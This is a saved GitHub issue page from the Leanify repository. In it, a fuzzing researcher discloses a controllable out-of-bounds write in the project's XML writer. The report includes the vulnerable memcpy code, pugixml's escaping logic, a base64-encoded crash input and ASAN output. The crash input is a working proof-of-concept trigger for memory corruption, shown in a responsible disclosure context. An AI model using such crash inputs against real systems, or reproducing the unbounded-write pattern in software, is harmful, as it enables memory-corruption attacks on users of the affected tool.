=== Content from github.com_d0771667_20250121_003856.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJayXon%2FLeanify%2Fissues%2F52)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJayXon%2FLeanify%2Fissues%2F52)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=JayXon%2FLeanify)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[JayXon](/JayXon)
/
**[Leanify](/JayXon/Leanify)**
Public

* [Notifications](/login?return_to=%2FJayXon%2FLeanify) You must be signed in to change notification settings
* [Fork
  76](/login?return_to=%2FJayXon%2FLeanify)
* [Star
   838](/login?return_to=%2FJayXon%2FLeanify)

* [Code](/JayXon/Leanify)
* [Issues
  20](/JayXon/Leanify/issues)
* [Pull requests
  1](/JayXon/Leanify/pulls)
* [Discussions](/JayXon/Leanify/discussions)
* [Actions](/JayXon/Leanify/actions)
* [Projects
  0](/JayXon/Leanify/projects)
* [Wiki](/JayXon/Leanify/wiki)
* [Security](/JayXon/Leanify/security)
* [Insights](/JayXon/Leanify/pulse)

Additional navigation options

* [Code](/JayXon/Leanify)
* [Issues](/JayXon/Leanify/issues)
* [Pull requests](/JayXon/Leanify/pulls)
* [Discussions](/JayXon/Leanify/discussions)
* [Actions](/JayXon/Leanify/actions)
* [Projects](/JayXon/Leanify/projects)
* [Wiki](/JayXon/Leanify/wiki)
* [Security](/JayXon/Leanify/security)
* [Insights](/JayXon/Leanify/pulse)

# Fuzzing Tests: OOB Write in XML Parser #52

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Fuzzing Tests: OOB Write in XML Parser](#top)#52Copy link![@ghost](https://github.com/ghost.png?size=80)
## Description

![@ghost](https://github.com/ghost.png?size=48)[ghost](/ghost)opened [on May 24, 2019](https://github.com/JayXon/Leanify/issues/52#issue-448298334)

Controlled Length Out of Bounds Write

Using the corpus of test files from the previous crash I also included an XML file. The crash is relative to the XML library implementation of Leanify resulting in another issue with an OOB write independent of the fixed OOB Read/Write in ICO. I discovered this via fuzzing and did some light root cause analysis and another party heavily expanded on the exploitability of this issue. Details below:

**A moderately controllable memory corruption vulnerability affects the implementation of xml\_memory\_writer in formats/xml.cpp:179 as shown below:**

++

struct xml\_memory\_writer : pugi::xml\_writer {

uint8\_t\* p\_write;

void write(const void\* data, size\_t size) override {

memcpy(p\_write, data, size); # Line 179

p\_write += size;

}

};

} // namespace

**pugi::xml\_writer implementations should additionally track the capacity of the target buffer as shown in the pugixml documentation here:** <https://pugixml.org/docs/samples/save_custom_writer.cpp>

**It is possible to control the amount of data written past the end of the buffer by appending characters that require escaping as shown in the text\_output\_escaped function in pugixml.cpp:3906 as shown below:**

++

PUGI\_\_FN void text\_output\_escaped(xml\_buffered\_writer& writer, const char\_t\* s, chartypex\_t type, unsigned int flags)

{

/\* TRUNCATED \*/

switch (\*s)

{

case 0: break;

case '&':

writer.write('&', 'a', 'm', 'p', ';');

++s;

break;

case '<':

writer.write('&', 'l', 't', ';');

++s;

break;

case '>':

writer.write('&', 'g', 't', ';');

++s;

break;

case '"':

writer.write('&', 'q', 'u', 'o', 't', ';');

++s;

break;

default: // s is not a usual symbol

{

unsigned int ch = static\_cast(\*s++);

assert(ch < 32);

```
                                    if (!(flags & format_skip_control_chars))
                                            writer.write('&', '#', static_cast<char_t>((ch / 10) + '0'), static_cast<char_t>((ch % 10) + '0'), ';');
                            }

```

/\* TRUNCATED \*/

**The following base64 test case will crash the target binary by expanding a number of & to the escaped & (a gain of 4 bytes in extension).**

PHBlcnNvbiBpZD0iPgombmFtYW5nciBSb2FDL2RpdBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECYm

JiYmJiYmJiYmJiZ5JnkmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JyYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJkhFQVBfT1ZFUkZMT1cmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

JiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYm

EBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBBpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlp

aWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlsaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaXdpaWlp

aWlpEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEGdhIFJvYUMvZGl0eT4KEBAQEBAQEBAQ

EBBpaWlpaWlpaWlpaWlpaWlDaXR5PkghbmdhYXN0ZXIgSXNhaWxzLiAsIj4KPC9wZXJzb24+Cg==

**For full stack trace on the crash, see the ASAN output below:**

=================================================================

==461==ERROR: AddressSanitizer: unknown-crash on address 0xb7fce000 at pc 0xb7af7a42 bp 0xbfffc8f8 sp 0xbfffc4cc

WRITE of size 518 at 0xb7fce000 thread T0

#0 0xb7af7a41 in \_\_asan\_memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8aa41)

[#1](https://github.com/JayXon/Leanify/pull/1) 0xb7af7c2f in memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ac2f)

[#2](https://github.com/JayXon/Leanify/issues/2) 0x819a38c in (anonymous namespace)::xml\_memory\_writer::write(void const\*, unsigned int) [clone .lto\_priv.243] formats/xml.cpp:179

[#3](https://github.com/JayXon/Leanify/issues/3) 0x80d927e in flush lib/pugixml/pugixml.cpp:3716

[#4](https://github.com/JayXon/Leanify/issues/4) 0x80d9106 in pugi::impl::(anonymous namespace)::xml\_buffered\_writer::flush() [clone .lto\_priv.561] lib/pugixml/pugixml.cpp:3705

[#5](https://github.com/JayXon/Leanify/issues/5) 0x80bfed4 in pugi::xml\_document::save(pugi::xml\_writer&, char const\*, unsigned int, pugi::xml\_encoding) const lib/pugixml/pugixml.cpp:7168

[#6](https://github.com/JayXon/Leanify/issues/6) 0x819b5fe in Xml::Leanify(unsigned int) formats/xml.cpp:307

[#7](https://github.com/JayXon/Leanify/pull/7) 0x81af203 in LeanifyFile(void\*, unsigned int, unsigned int, std::\_\_cxx11::basic\_string<char, std::char\_traits, std::allocator > const

&) /root/Leanify/leanify.cpp:140

[#8](https://github.com/JayXon/Leanify/pull/8) 0x81b08c2 in ProcessFile /root/Leanify/main.cpp:53

[#9](https://github.com/JayXon/Leanify/pull/9) 0x81b1cde in main /root/Leanify/main.cpp:230

[#10](https://github.com/JayXon/Leanify/issues/10) 0xb76e6636 in \_\_libc\_start\_main (/lib/i386-linux-gnu/libc.so.6+0x18636)

[#11](https://github.com/JayXon/Leanify/issues/11) 0x804b650 (/root/Leanify/leanify+0x804b650)

The testfile was generated using the AFL fuzzer by lcamtuf.

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


